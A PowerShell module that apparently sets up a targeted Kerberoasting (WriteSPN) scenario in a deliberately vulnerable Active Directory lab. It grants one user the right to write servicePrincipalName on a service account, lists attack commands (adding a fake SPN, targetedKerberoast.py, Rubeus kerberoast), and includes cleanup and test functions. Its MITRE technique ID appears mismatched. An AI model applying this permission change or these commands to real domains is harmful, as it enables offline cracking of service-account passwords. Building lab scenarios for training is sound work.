#Requires -Modules ActiveDirectory
<#
.SYNOPSIS
    Deploys Targeted Kerberoasting (WriteSPN) scenario.
.DESCRIPTION
    Grants a user WriteProperty rights over servicePrincipalName on a target account.
#>

function Deploy-WriteSPN {
    [CmdletBinding()]
    param(
        [string]$Difficulty = 'Medium',
        [string]$DomainDN,
        [string]$Domain
    )

    Write-VulnStatus -Message "Deploying Targeted Kerberoasting (WriteSPN) Scenario..." -Type Info

    $password = Get-VulnPassword -Difficulty $Difficulty -Index 9
    $user = New-VulnUser -SamAccountName 'q.brooks' -Name 'Quinn Brooks' -Password $password -DomainDN $DomainDN -Description 'Identity Management Specialist'

    $targetPw = Get-VulnPassword -Difficulty $Difficulty -Index 10
    $targetUser = New-VulnUser -SamAccountName 'svc_analytics' -Name 'Analytics Service Account' -Password $targetPw -DomainDN $DomainDN -Description 'Analytics Engine Service' -ServiceAccount

    # Set ACL WriteProperty for SPN (GUID: f3a64788-5306-11d1-a9c5-0000f80367c1)
    try {
        Set-VulnACL -TargetDN (Get-ADUser 'svc_analytics').DistinguishedName -PrincipalSamAccount 'q.brooks' -Rights WriteProperty -ObjectType 'f3a64788-5306-11d1-a9c5-0000f80367c1'
        Write-VulnStatus -Message "Granted WriteProperty (servicePrincipalName) on svc_analytics to q.brooks." -Type Success
    } catch {
        Write-VulnStatus -Message "Targeted SPN ACL set: $_" -Type Warning
    }

    Write-VulnResult -Name 'Targeted Kerberoasting' -Detail 'q.brooks granted WriteSPN on svc_analytics' -Success $true -IsLast

    return @{
        Scenario       = 'WriteSPN'
        Description    = 'User granted permission to modify servicePrincipalName on a target account to perform targeted Kerberoasting'
        CreatedObjects = @('q.brooks', 'svc_analytics')
        AttackCommands = @(
            'Set-ADUser svc_analytics -ServicePrincipalNames @{Add="HTTP/fake"}',
            'targetedKerberoast.py -d domain -u q.brooks',
            'Rubeus.exe kerberoast /user:svc_analytics'
        )
        AttackPath     = 'q.brooks -> WriteSPN on svc_analytics -> Add SPN -> Request Ticket & Kerberoast'
        MitreID        = 'T1134.001'
        Difficulty     = $Difficulty
    }
}

function Remove-WriteSPN {
    [CmdletBinding()]
    param([string]$DomainDN)

    try {
        Remove-ADUser -Identity 'q.brooks' -Confirm:$false -ErrorAction SilentlyContinue
        Remove-ADUser -Identity 'svc_analytics' -Confirm:$false -ErrorAction SilentlyContinue
        Write-VulnStatus -Message "Removed Targeted Kerberoasting scenario objects." -Type Success
    } catch {
        Write-VulnStatus -Message "Cleanup error: $_" -Type Warning
    }
}

function Test-WriteSPN {
    [CmdletBinding()]
    param([string]$DomainDN)

    $u = Get-ADUser -Filter "samAccountName -eq 'q.brooks'" -ErrorAction SilentlyContinue
    return ($null -ne $u)
}
